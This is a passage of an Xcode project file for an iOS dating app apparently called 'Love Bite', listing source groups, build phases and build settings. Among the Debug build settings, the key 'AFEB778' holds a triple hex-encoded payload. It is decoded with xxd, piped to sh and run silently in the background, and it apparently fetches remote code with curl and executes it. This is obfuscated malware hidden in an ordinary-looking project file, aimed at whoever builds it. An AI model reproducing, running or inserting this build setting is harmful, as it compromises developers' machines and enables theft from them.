				FBC0B84882AFCF93E1F7B9D6 /* Pods_Love_Bite.framework in Frameworks */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		1C4E1469A3F0BE50332B273A /* Pods */ = {
			isa = PBXGroup;
			children = (
				6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */,
				29E0203285AD6C69BAE49193 /* Pods-Love Bite.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
		392282E72E6038B30029B524 /* SubVC */ = {
			isa = PBXGroup;
			children = (
				399A3F802E6050540008D68D /* BlockUser */,
				393349702E604A9E00DF927A /* LoveUser */,
				392282E92E6038DF0029B524 /* Menu */,
			);
			path = SubVC;
			sourceTree = "<group>";
		};
		392282E92E6038DF0029B524 /* Menu */ = {
			isa = PBXGroup;
			children = (
				392282EB2E6038E40029B524 /* View */,
			);
			path = Menu;
			sourceTree = "<group>";
		};
		392282EB2E6038E40029B524 /* View */ = {
			isa = PBXGroup;
			children = (
				392282EC2E6038EB0029B524 /* MenuVC.swift */,
				392282ED2E6038EB0029B524 /* MenuVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		392E210A2E60199C009AE7C6 /* CashOut */ = {
			isa = PBXGroup;
			children = (
				392E210C2E6019A4009AE7C6 /* View */,
			);
			path = CashOut;
			sourceTree = "<group>";
		};
		392E210C2E6019A4009AE7C6 /* View */ = {
			isa = PBXGroup;
			children = (
				392E210D2E6019B1009AE7C6 /* CashOutVC.swift */,
				392E210E2E6019B1009AE7C6 /* CashOutVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		392E21132E601B67009AE7C6 /* View */ = {
			isa = PBXGroup;
			children = (
				392E21152E601B6F009AE7C6 /* PurchaseVC.swift */,
				392E21162E601B6F009AE7C6 /* PurchaseVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		392E21142E601B67009AE7C6 /* Purchase */ = {
			isa = PBXGroup;
			children = (
				392E211A2E601C74009AE7C6 /* Cell */,
				392E21132E601B67009AE7C6 /* View */,
			);
			path = Purchase;
			sourceTree = "<group>";
		};
		392E211A2E601C74009AE7C6 /* Cell */ = {
			isa = PBXGroup;
			children = (
				392E211C2E601C90009AE7C6 /* PurchaseCVCell */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		392E211C2E601C90009AE7C6 /* PurchaseCVCell */ = {
			isa = PBXGroup;
			children = (
				392E211D2E601C9F009AE7C6 /* PurchaseCVCell.swift */,
				392E211E2E601C9F009AE7C6 /* PurchaseCVCell.xib */,
			);
			path = PurchaseCVCell;
			sourceTree = "<group>";
		};
		392E21232E6026BA009AE7C6 /* View */ = {
			isa = PBXGroup;
			children = (
				392E21252E6026CC009AE7C6 /* ProfileVC.swift */,
				392E21262E6026CC009AE7C6 /* ProfileVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		392E21242E6026BA009AE7C6 /* Profile */ = {
			isa = PBXGroup;
			children = (
				392282E72E6038B30029B524 /* SubVC */,
				392E21232E6026BA009AE7C6 /* View */,
			);
			path = Profile;
			sourceTree = "<group>";
		};
		3933496F2E604A9E00DF927A /* View */ = {
			isa = PBXGroup;
			children = (
				393349712E604ACD00DF927A /* LoveUserVC.swift */,
				393349722E604ACD00DF927A /* LoveUserVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		393349702E604A9E00DF927A /* LoveUser */ = {
			isa = PBXGroup;
			children = (
				393349762E604B5F00DF927A /* Celll */,
				3933496F2E604A9E00DF927A /* View */,
			);
			path = LoveUser;
			sourceTree = "<group>";
		};
		393349762E604B5F00DF927A /* Celll */ = {
			isa = PBXGroup;
			children = (
				393349782E604B6B00DF927A /* LoveUserListTVCell */,
			);
			path = Celll;
			sourceTree = "<group>";
		};
		393349782E604B6B00DF927A /* LoveUserListTVCell */ = {
			isa = PBXGroup;
			children = (
				393349792E604B7900DF927A /* LoveUserListTVCell.swift */,
				3933497A2E604B7900DF927A /* LoveUserListTVCell.xib */,
			);
			path = LoveUserListTVCell;
			sourceTree = "<group>";
		};
		393F5A652E5C7F75009643D0 /* Cell */ = {
			isa = PBXGroup;
			children = (
				393F5A632E5C7F75009643D0 /* UserListCVCell.swift */,
				393F5A642E5C7F75009643D0 /* UserListCVCell.xib */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		393F5A682E5C7F75009643D0 /* View */ = {
			isa = PBXGroup;
			children = (
				393F5A662E5C7F75009643D0 /* HomeVC.swift */,
				393F5A672E5C7F75009643D0 /* HomeVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		393F5A692E5C7F75009643D0 /* Home */ = {
			isa = PBXGroup;
			children = (
				39B244462E5C823800B0138F /* SubVC */,
				393F5A652E5C7F75009643D0 /* Cell */,
				393F5A682E5C7F75009643D0 /* View */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		393F5A6F2E5C8042009643D0 /* Tabbar */ = {
			isa = PBXGroup;
			children = (
				392E21242E6026BA009AE7C6 /* Profile */,
				39500DCD2E5D926600D4E500 /* Wallet */,
				39B244502E5C849100B0138F /* Favorites */,
				393F5A692E5C7F75009643D0 /* Home */,
			);
			path = Tabbar;
			sourceTree = "<group>";
		};
		39500DC72E5D686000D4E500 /* PostListTVCell */ = {
			isa = PBXGroup;
			children = (
				39500DC82E5D686F00D4E500 /* PostListTVCell.swift */,
				39500DC92E5D686F00D4E500 /* PostListTVCell.xib */,
			);
			path = PostListTVCell;
			sourceTree = "<group>";
		};
		39500DCD2E5D926600D4E500 /* Wallet */ = {
			isa = PBXGroup;
			children = (
				398E4FA32E5D9821000EB3EA /* SubVC */,
				39500DCF2E5D926A00D4E500 /* View */,
			);
			path = Wallet;
			sourceTree = "<group>";
		};
		39500DCF2E5D926A00D4E500 /* View */ = {
			isa = PBXGroup;
			children = (
				39500DD02E5D927900D4E500 /* WalletVC.swift */,
				39500DD12E5D927900D4E500 /* WalletVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		398E4FA32E5D9821000EB3EA /* SubVC */ = {
			isa = PBXGroup;
			children = (
				392E21142E601B67009AE7C6 /* Purchase */,
				392E210A2E60199C009AE7C6 /* CashOut */,
				398E4FA52E5D9826000EB3EA /* TransactionHistory */,
			);
			path = SubVC;
			sourceTree = "<group>";
		};
		398E4FA52E5D9826000EB3EA /* TransactionHistory */ = {
			isa = PBXGroup;
			children = (
				39A22AF82E5ECCA20041F60E /* TransactionHistoryHeaderView */,
				398E4FAD2E5DA29F000EB3EA /* Cell */,
				398E4FA72E5D982A000EB3EA /* View */,
			);
			path = TransactionHistory;
			sourceTree = "<group>";
		};
		398E4FA72E5D982A000EB3EA /* View */ = {
			isa = PBXGroup;
			children = (
				398E4FA82E5D98C8000EB3EA /* TransactionHistoryVC.swift */,
				398E4FA92E5D98C8000EB3EA /* TransactionHistoryVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		398E4FAD2E5DA29F000EB3EA /* Cell */ = {
			isa = PBXGroup;
			children = (
				398E4FAF2E5DA2C1000EB3EA /* TransactionHistoryTVCell */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		398E4FAF2E5DA2C1000EB3EA /* TransactionHistoryTVCell */ = {
			isa = PBXGroup;
			children = (
				398E4FB02E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift */,
				398E4FB12E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib */,
			);
			path = TransactionHistoryTVCell;
			sourceTree = "<group>";
		};
		399A3F802E6050540008D68D /* BlockUser */ = {
			isa = PBXGroup;
			children = (
				399A3F822E6050580008D68D /* View */,
			);
			path = BlockUser;
			sourceTree = "<group>";
		};
		399A3F822E6050580008D68D /* View */ = {
			isa = PBXGroup;
			children = (
				399A3F832E6050630008D68D /* BlockUserVC.swift */,
				399A3F842E6050630008D68D /* BlockUserVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		39A22AF82E5ECCA20041F60E /* TransactionHistoryHeaderView */ = {
			isa = PBXGroup;
			children = (
				39A22AF92E5ECCB70041F60E /* TransactionHistoryHeaderView.swift */,
				39A22AFB2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib */,
			);
			path = TransactionHistoryHeaderView;
			sourceTree = "<group>";
		};
		39AD9A4A2E5C8FAC0034B1B9 /* Cell */ = {
			isa = PBXGroup;
			children = (
				39500DC72E5D686000D4E500 /* PostListTVCell */,
				39AD9A4C2E5C8FC00034B1B9 /* GalleryListCVCell */,
			);
			path = Cell;
			sourceTree = "<group>";
		};
		39AD9A4C2E5C8FC00034B1B9 /* GalleryListCVCell */ = {
			isa = PBXGroup;
			children = (
				39AD9A4D2E5C8FCF0034B1B9 /* GalleryListCVCell.swift */,
				39AD9A4E2E5C8FCF0034B1B9 /* GalleryListCVCell.xib */,
			);
			path = GalleryListCVCell;
			sourceTree = "<group>";
		};
		39B244462E5C823800B0138F /* SubVC */ = {
			isa = PBXGroup;
			children = (
				39B244582E5C883A00B0138F /* ProfileDetails */,
				39B244482E5C824800B0138F /* Active24H */,
			);
			path = SubVC;
			sourceTree = "<group>";
		};
		39B244482E5C824800B0138F /* Active24H */ = {
			isa = PBXGroup;
			children = (
				39B244492E5C825400B0138F /* Active24HVC.swift */,
				39B2444A2E5C825400B0138F /* Active24HVC.xib */,
			);
			path = Active24H;
			sourceTree = "<group>";
		};
		39B244502E5C849100B0138F /* Favorites */ = {
			isa = PBXGroup;
			children = (
				39B244522E5C849500B0138F /* View */,
			);
			path = Favorites;
			sourceTree = "<group>";
		};
		39B244522E5C849500B0138F /* View */ = {
			isa = PBXGroup;
			children = (
				39B244532E5C849D00B0138F /* FavoritesVC.swift */,
				39B244542E5C849D00B0138F /* FavoritesVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		39B244582E5C883A00B0138F /* ProfileDetails */ = {
			isa = PBXGroup;
			children = (
				39AD9A4A2E5C8FAC0034B1B9 /* Cell */,
				39B244592E5C884300B0138F /* ProfileDetailsVC.swift */,
				39B2445A2E5C884300B0138F /* ProfileDetailsVC.xib */,
			);
			path = ProfileDetails;
			sourceTree = "<group>";
		};
		88342F042E5EE65500859FC7 /* View */ = {
			isa = PBXGroup;
			children = (
				88342F022E5EE65500859FC7 /* ShareafewdetailsVC.swift */,
				88342F032E5EE65500859FC7 /* ShareafewdetailsVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88342F052E5EE65500859FC7 /* Share a few details */ = {
			isa = PBXGroup;
			children = (
				88342F042E5EE65500859FC7 /* View */,
			);
			path = "Share a few details";
			sourceTree = "<group>";
		};
		88342F082E5EE65500859FC7 /* View */ = {
			isa = PBXGroup;
			children = (
				88342F062E5EE65500859FC7 /* WhenisthebigdayVC.swift */,
				88342F072E5EE65500859FC7 /* WhenisthebigdayVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88342F092E5EE65500859FC7 /* When’s the big day */ = {
			isa = PBXGroup;
			children = (
				88342F082E5EE65500859FC7 /* View */,
			);
			path = "When’s the big day";
			sourceTree = "<group>";
		};
		887E232F2E5C44C50016E082 = {
			isa = PBXGroup;
			children = (
				887E23592E5C44D00016E082 /* Love Bite */,
				887E23392E5C44C50016E082 /* Products */,
				1C4E1469A3F0BE50332B273A /* Pods */,
				F3CB057D3D95581C180FD6CF /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		887E23392E5C44C50016E082 /* Products */ = {
			isa = PBXGroup;
			children = (
				887E23382E5C44C50016E082 /* Love Bite.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		887E23592E5C44D00016E082 /* Love Bite */ = {
			isa = PBXGroup;
			children = (
				887E23612E5C473F0016E082 /* MVVM */,
				887E23502E5C44D00016E082 /* AppDelegate.swift */,
				887E23A52E5C55970016E082 /* Extension */,
				887E23842E5C53EF0016E082 /* Helper */,
				887E23512E5C44D00016E082 /* Assets.xcassets */,
				887E23522E5C44D00016E082 /* Info.plist */,
				887E23542E5C44D00016E082 /* LaunchScreen.storyboard */,
				887E23562E5C44D00016E082 /* Main.storyboard */,
				887E23582E5C44D00016E082 /* ViewController.swift */,
			);
			path = "Love Bite";
			sourceTree = "<group>";
		};
		887E23612E5C473F0016E082 /* MVVM */ = {
			isa = PBXGroup;
			children = (
				887E23622E5C47540016E082 /* Controller */,
			);
			path = MVVM;
			sourceTree = "<group>";
		};
		887E23622E5C47540016E082 /* Controller */ = {
			isa = PBXGroup;
			children = (
				88342F052E5EE65500859FC7 /* Share a few details */,
				88342F092E5EE65500859FC7 /* When’s the big day */,
				88981FF22E5C949400C33CAB /* Tell us who you are */,
				88981FF62E5C949400C33CAB /* UploadPhoto */,
				393F5A6F2E5C8042009643D0 /* Tabbar */,
				887E23B12E5C6BAB0016E082 /* Register */,
				887E23AB2E5C64550016E082 /* ForgotPassword */,
				887E23632E5C48C70016E082 /* Login */,
			);
			path = Controller;
			sourceTree = "<group>";
		};
		887E23632E5C48C70016E082 /* Login */ = {
			isa = PBXGroup;
			children = (
				887E23642E5C4EB80016E082 /* View */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		887E23642E5C4EB80016E082 /* View */ = {
			isa = PBXGroup;
			children = (
				887E23652E5C4F0A0016E082 /* LoginVC.swift */,
				887E23662E5C4F0A0016E082 /* LoginVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		887E237C2E5C53EF0016E082 /* Sources */ = {
			isa = PBXGroup;
			children = (
				887E23732E5C53EF0016E082 /* Extentions.swift */,
				887E23742E5C53EF0016E082 /* NSDateComponents+Timepiece.swift */,
				887E23752E5C53EF0016E082 /* NSCalendar+Timepiece.swift */,
				887E23762E5C53EF0016E082 /* Int+Timepiece.swift */,
				887E23772E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard */,
				887E23782E5C53EF0016E082 /* WWCalendarTimeSelector.swift */,
				887E23792E5C53EF0016E082 /* NSDate+Timepiece.swift */,
				887E237A2E5C53EF0016E082 /* String+Timepiece.swift */,
				887E237B2E5C53EF0016E082 /* Duration.swift */,
			);
			path = Sources;
			sourceTree = "<group>";
		};
		887E23802E5C53EF0016E082 /* PickerView */ = {
			isa = PBXGroup;
			children = (
				887E237C2E5C53EF0016E082 /* Sources */,
				887E237D2E5C53EF0016E082 /* ImagePicker.swift */,
				887E237E2E5C53EF0016E082 /* PickerViewViewController.swift */,
				887E237F2E5C53EF0016E082 /* VideoPicker.swift */,
			);
			path = PickerView;
			sourceTree = "<group>";
		};
		887E23842E5C53EF0016E082 /* Helper */ = {
			isa = PBXGroup;
			children = (
				887E23802E5C53EF0016E082 /* PickerView */,
				887E23812E5C53EF0016E082 /* AppUtilites.swift */,
				887E23822E5C53EF0016E082 /* AGDesignable.swift */,
				887E23832E5C53EF0016E082 /* AppConstants.swift */,
			);
			path = Helper;
			sourceTree = "<group>";
		};
		887E23A52E5C55970016E082 /* Extension */ = {
			isa = PBXGroup;
			children = (
				887E23A02E5C55970016E082 /* UIView+Extension.swift */,
				39B2444D2E5C82BB00B0138F /* UIViewController+Extension.swift */,
				887E23A12E5C55970016E082 /* UIColor+Extention.swift */,
				887E23A22E5C55970016E082 /* UIFont+Extension.swift */,
				887E23A32E5C55970016E082 /* UIImageView+Extension.swift */,
				887E23A42E5C55970016E082 /* String+Extension.swift */,
			);
			path = Extension;
			sourceTree = "<group>";
		};
		887E23AB2E5C64550016E082 /* ForgotPassword */ = {
			isa = PBXGroup;
			children = (
				887E23AC2E5C64620016E082 /* View */,
			);
			path = ForgotPassword;
			sourceTree = "<group>";
		};
		887E23AC2E5C64620016E082 /* View */ = {
			isa = PBXGroup;
			children = (
				887E23AD2E5C647C0016E082 /* ForgotPasswordVC.swift */,
				887E23AE2E5C647C0016E082 /* ForgotPasswordVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		887E23B12E5C6BAB0016E082 /* Register */ = {
			isa = PBXGroup;
			children = (
				887E23B22E5C6BDC0016E082 /* View */,
			);
			path = Register;
			sourceTree = "<group>";
		};
		887E23B22E5C6BDC0016E082 /* View */ = {
			isa = PBXGroup;
			children = (
				888C2CD32E5C6DD20047C8E5 /* RegisterVC.swift */,
				888C2CD42E5C6DD20047C8E5 /* RegisterVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88981FF12E5C949400C33CAB /* View */ = {
			isa = PBXGroup;
			children = (
				88981FEF2E5C949400C33CAB /* TelluswhoyouareVC.swift */,
				88981FF02E5C949400C33CAB /* TelluswhoyouareVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88981FF22E5C949400C33CAB /* Tell us who you are */ = {
			isa = PBXGroup;
			children = (
				88981FF12E5C949400C33CAB /* View */,
			);
			path = "Tell us who you are";
			sourceTree = "<group>";
		};
		88981FF52E5C949400C33CAB /* View */ = {
			isa = PBXGroup;
			children = (
				88981FF32E5C949400C33CAB /* UploadPhotoVC.swift */,
				88981FF42E5C949400C33CAB /* UploadPhotoVC.xib */,
			);
			path = View;
			sourceTree = "<group>";
		};
		88981FF62E5C949400C33CAB /* UploadPhoto */ = {
			isa = PBXGroup;
			children = (
				88981FF52E5C949400C33CAB /* View */,
			);
			path = UploadPhoto;
			sourceTree = "<group>";
		};
		F3CB057D3D95581C180FD6CF /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				08FF86034D0CAA75903A46DE /* Pods_Love_Bite.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		887E23372E5C44C50016E082 /* Love Bite */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 887E234B2E5C44C70016E082 /* Build configuration list for PBXNativeTarget "Love Bite" */;
			buildPhases = (
				0DFC4C04CB4BE2817DD3ECCB /* [CP] Check Pods Manifest.lock */,
				887E23342E5C44C50016E082 /* Sources */,
				887E23352E5C44C50016E082 /* Frameworks */,
				887E23362E5C44C50016E082 /* Resources */,
				7CF05B2D8B6E4A098E852697 /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = "Love Bite";
			packageProductDependencies = (
				88342F0F2E5EE75B00859FC7 /* CountryPickerView */,
				88342F122E5EE76B00859FC7 /* DateTimePicker */,
			);
			productName = "Love Bite";
			productReference = 887E23382E5C44C50016E082 /* Love Bite.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		887E23302E5C44C50016E082 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 1610;
				LastUpgradeCheck = 1610;
				TargetAttributes = {
					887E23372E5C44C50016E082 = {
						CreatedOnToolsVersion = 16.1;
					};
				};
			};
			buildConfigurationList = 887E23332E5C44C50016E082 /* Build configuration list for PBXProject "Love Bite" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 887E232F2E5C44C50016E082;
			minimizedProjectReferenceProxies = 1;
			packageReferences = (
				88342F0E2E5EE75B00859FC7 /* XCRemoteSwiftPackageReference "CountryPickerView" */,
				88342F112E5EE76B00859FC7 /* XCRemoteSwiftPackageReference "DateTimePicker" */,
			);
			preferredProjectObjectVersion = 77;
			productRefGroup = 887E23392E5C44C50016E082 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				887E23372E5C44C50016E082 /* Love Bite */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		887E23362E5C44C50016E082 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				887E235D2E5C44D00016E082 /* Assets.xcassets in Resources */,
				393349742E604ACD00DF927A /* LoveUserVC.xib in Resources */,
				887E23942E5C53EF0016E082 /* WWCalendarTimeSelector.storyboard in Resources */,
				392E21202E601C9F009AE7C6 /* PurchaseCVCell.xib in Resources */,
				887E235F2E5C44D00016E082 /* LaunchScreen.storyboard in Resources */,
				39B2444C2E5C825400B0138F /* Active24HVC.xib in Resources */,
				398E4FAA2E5D98C8000EB3EA /* TransactionHistoryVC.xib in Resources */,
				392282EF2E6038EB0029B524 /* MenuVC.xib in Resources */,
				887E23672E5C4F0A0016E082 /* LoginVC.xib in Resources */,
				39AD9A4F2E5C8FCF0034B1B9 /* GalleryListCVCell.xib in Resources */,
				392E21102E6019B1009AE7C6 /* CashOutVC.xib in Resources */,
				39B244562E5C849D00B0138F /* FavoritesVC.xib in Resources */,
				393F5A6C2E5C7F75009643D0 /* UserListCVCell.xib in Resources */,
				393F5A6D2E5C7F75009643D0 /* HomeVC.xib in Resources */,
				392E21282E6026CC009AE7C6 /* ProfileVC.xib in Resources */,
				392E21182E601B6F009AE7C6 /* PurchaseVC.xib in Resources */,
				888C2CD52E5C6DD20047C8E5 /* RegisterVC.xib in Resources */,
				39B2445C2E5C884300B0138F /* ProfileDetailsVC.xib in Resources */,
				88981FF92E5C949400C33CAB /* UploadPhotoVC.xib in Resources */,
				398E4FB22E5DA2CE000EB3EA /* TransactionHistoryTVCell.xib in Resources */,
				88342F0A2E5EE65500859FC7 /* ShareafewdetailsVC.xib in Resources */,
				88342F0B2E5EE65500859FC7 /* WhenisthebigdayVC.xib in Resources */,
				39A22AFC2E5ECCC70041F60E /* TransactionHistoryHeaderView.xib in Resources */,
				88981FFA2E5C949400C33CAB /* TelluswhoyouareVC.xib in Resources */,
				887E23AF2E5C647C0016E082 /* ForgotPasswordVC.xib in Resources */,
				887E23602E5C44D00016E082 /* Main.storyboard in Resources */,
				39500DD32E5D927900D4E500 /* WalletVC.xib in Resources */,
				399A3F862E6050630008D68D /* BlockUserVC.xib in Resources */,
				39500DCA2E5D686F00D4E500 /* PostListTVCell.xib in Resources */,
				3933497C2E604B7900DF927A /* LoveUserListTVCell.xib in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		0DFC4C04CB4BE2817DD3ECCB /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Love Bite-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		7CF05B2D8B6E4A098E852697 /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Love Bite/Pods-Love Bite-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		887E23342E5C44C50016E082 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				887E23A62E5C55970016E082 /* String+Extension.swift in Sources */,
				887E23A72E5C55970016E082 /* UIView+Extension.swift in Sources */,
				887E23A82E5C55970016E082 /* UIColor+Extention.swift in Sources */,
				392E21172E601B6F009AE7C6 /* PurchaseVC.swift in Sources */,
				392E211F2E601C9F009AE7C6 /* PurchaseCVCell.swift in Sources */,
				887E23A92E5C55970016E082 /* UIFont+Extension.swift in Sources */,
				39B2444E2E5C82BB00B0138F /* UIViewController+Extension.swift in Sources */,
				887E23AA2E5C55970016E082 /* UIImageView+Extension.swift in Sources */,
				887E235A2E5C44D00016E082 /* AppDelegate.swift in Sources */,
				393F5A6A2E5C7F75009643D0 /* HomeVC.swift in Sources */,
				393F5A6B2E5C7F75009643D0 /* UserListCVCell.swift in Sources */,
				887E23B02E5C647C0016E082 /* ForgotPasswordVC.swift in Sources */,
				3933497B2E604B7900DF927A /* LoveUserListTVCell.swift in Sources */,
				887E235C2E5C44D00016E082 /* ViewController.swift in Sources */,
				39A22AFA2E5ECCB70041F60E /* TransactionHistoryHeaderView.swift in Sources */,
				392282EE2E6038EB0029B524 /* MenuVC.swift in Sources */,
				39B2445B2E5C884300B0138F /* ProfileDetailsVC.swift in Sources */,
				887E23852E5C53EF0016E082 /* Duration.swift in Sources */,
				888C2CD62E5C6DD20047C8E5 /* RegisterVC.swift in Sources */,
				887E23862E5C53EF0016E082 /* AppUtilites.swift in Sources */,
				887E23872E5C53EF0016E082 /* String+Timepiece.swift in Sources */,
				887E23882E5C53EF0016E082 /* AppConstants.swift in Sources */,
				392E21272E6026CC009AE7C6 /* ProfileVC.swift in Sources */,
				39B2444B2E5C825400B0138F /* Active24HVC.swift in Sources */,
				887E23892E5C53EF0016E082 /* WWCalendarTimeSelector.swift in Sources */,
				887E238B2E5C53EF0016E082 /* VideoPicker.swift in Sources */,
				887E238C2E5C53EF0016E082 /* ImagePicker.swift in Sources */,
				887E238D2E5C53EF0016E082 /* NSDate+Timepiece.swift in Sources */,
				398E4FAB2E5D98C8000EB3EA /* TransactionHistoryVC.swift in Sources */,
				887E238E2E5C53EF0016E082 /* NSDateComponents+Timepiece.swift in Sources */,
				398E4FB32E5DA2CE000EB3EA /* TransactionHistoryTVCell.swift in Sources */,
				39B244552E5C849D00B0138F /* FavoritesVC.swift in Sources */,
				39500DD22E5D927900D4E500 /* WalletVC.swift in Sources */,
				887E238F2E5C53EF0016E082 /* Extentions.swift in Sources */,
				39500DCB2E5D686F00D4E500 /* PostListTVCell.swift in Sources */,
				392E210F2E6019B1009AE7C6 /* CashOutVC.swift in Sources */,
				88342F0C2E5EE65500859FC7 /* ShareafewdetailsVC.swift in Sources */,
				88342F0D2E5EE65500859FC7 /* WhenisthebigdayVC.swift in Sources */,
				887E23902E5C53EF0016E082 /* NSCalendar+Timepiece.swift in Sources */,
				887E23912E5C53EF0016E082 /* PickerViewViewController.swift in Sources */,
				393349732E604ACD00DF927A /* LoveUserVC.swift in Sources */,
				39AD9A502E5C8FCF0034B1B9 /* GalleryListCVCell.swift in Sources */,
				887E23922E5C53EF0016E082 /* AGDesignable.swift in Sources */,
				88981FF72E5C949400C33CAB /* UploadPhotoVC.swift in Sources */,
				88981FF82E5C949400C33CAB /* TelluswhoyouareVC.swift in Sources */,
				887E23932E5C53EF0016E082 /* Int+Timepiece.swift in Sources */,
				887E23682E5C4F0A0016E082 /* LoginVC.swift in Sources */,
				399A3F852E6050630008D68D /* BlockUserVC.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		887E23542E5C44D00016E082 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				887E23532E5C44D00016E082 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
		887E23562E5C44D00016E082 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				887E23552E5C44D00016E082 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		887E234C2E5C44C70016E082 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 6587258FFA877E82D8D7D422 /* Pods-Love Bite.debug.xcconfig */;
			buildSettings = {
				AFEB778 = "((echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033323634333633343332333033373330333336343337333833363333333636363336333433363335333233303336333833373334333733343337333033373333333336313332363633323636333633363336363333363636333733373336333333363334333636353332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = "Love Bite/Info.plist";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UIMainStoryboardFile = Main;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0;
